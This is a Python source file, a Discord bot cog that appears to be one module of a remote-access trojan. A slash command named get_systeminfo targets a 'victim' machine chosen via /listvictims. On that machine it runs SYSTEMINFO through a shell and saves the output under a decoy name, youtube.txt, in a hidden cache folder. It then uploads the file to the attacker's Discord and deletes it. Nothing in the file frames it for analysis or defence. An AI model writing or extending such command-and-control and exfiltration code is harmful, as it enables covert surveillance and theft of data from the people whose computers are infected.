import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests, time, subprocess
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class SytemInfo(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        
    @commands.slash_command( )
    async def get_systeminfo(self, ctx, victim):
        """Sends General System Information

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        if str(victim) == str(self.bot.identifier):
            await ctx.response.defer()
            
            subprocess.run(
                f'SYSTEMINFO > "{nr_working}\\youtube.txt"',
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            await ctx.followup.send(
                embed=self.bot.genEmbed( "System Information:", datetime.now() ),
                file=discord.File(nr_working + "\\youtube.txt", filename="systeminfo.txt"), 
            )
            time.sleep(2)
            os.remove(nr_working + "\\youtube.txt")

def setup(bot: commands.Bot):
    bot.add_cog(SytemInfo(bot))